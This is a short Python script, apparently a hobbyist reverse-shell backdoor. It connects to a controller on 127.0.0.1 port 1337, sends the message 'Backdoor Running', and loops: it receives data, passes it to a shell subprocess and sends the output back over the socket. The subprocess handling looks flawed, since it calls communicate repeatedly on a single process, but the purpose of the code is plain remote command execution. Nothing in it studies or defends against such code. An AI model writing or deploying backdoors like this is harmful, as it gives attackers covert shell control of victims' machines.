import socket as so
import subprocess as sb


Host = "127.0.0.1"
Port = 1337
s = so.socket(so.AF_INET, so.SOCK_STREAM)
s.connect((Host, Port))
s.send(b"Backdoor Running")
process = sb.Popen("echo Hallo", shell=True, stdin=sb.PIPE, stdout=sb.PIPE, stderr=sb.PIPE)
while True:
    data = s.recv(5120)
    print(data.decode("utf-8"))
    out, err = process.communicate(input=data)
    # out = process.stdout.read()
    # err = process.stderr.read()
    print(err.decode("cp850"))
    print(out.decode("cp850"))
    if len(out) == 0:
        s.send("<Leer>".encode(encoding='cp850'))
    else:
        s.send(out)
        # s.send(process.stderr.read())
